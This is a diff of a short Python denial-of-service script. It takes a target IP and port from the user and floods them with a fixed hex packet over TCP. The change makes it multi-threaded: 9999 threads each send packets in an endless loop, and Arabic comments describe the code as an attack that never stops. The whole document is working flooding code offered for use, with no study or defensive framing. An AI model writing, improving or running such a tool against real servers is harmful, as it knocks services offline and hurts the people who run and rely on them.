@@ -1,23 +1,34 @@
 import socket
-import time
+import threading
 
+# إعدادات الهدف
 ip = input("IP: ")
 port = int(input("Port: "))
 num_connections = 9999
 
-packet = bytes.fromhex("F10400010900000001000000F2")
+# حزمة البيانات
+packet = bytes.fromhex("F10400010700000001000000F2")
 num_send_per_connection = 1000
 
-for _ in range(num_connections):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+# وظيفة الهجوم
+def send_packets():
+    while True:  # استمرار في الإرسال بدون توقف
         try:
-            s.connect((ip, port))
-            
-            for _ in range(num_send_per_connection):
-                s.sendall(packet)
-            
-            print(f"Done Fuck Server {ip} <3")
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((ip, port))
+                for _ in range(num_send_per_connection):
+                    s.sendall(packet)
+                print(f"Packets sent to {ip}:{port}")
         except Exception as e:
             print(f"Error: {e}")
 
-        time.sleep(0)
+# تنفيذ الهجوم باستخدام خيوط متعددة
+threads = []
+for _ in range(num_connections):
+    thread = threading.Thread(target=send_packets)
+    threads.append(thread)
+    thread.start()
+
+# انتظار انتهاء جميع الخيوط (لن يحدث لأن الهجوم مستمر)
+for thread in threads:
+    thread.join()
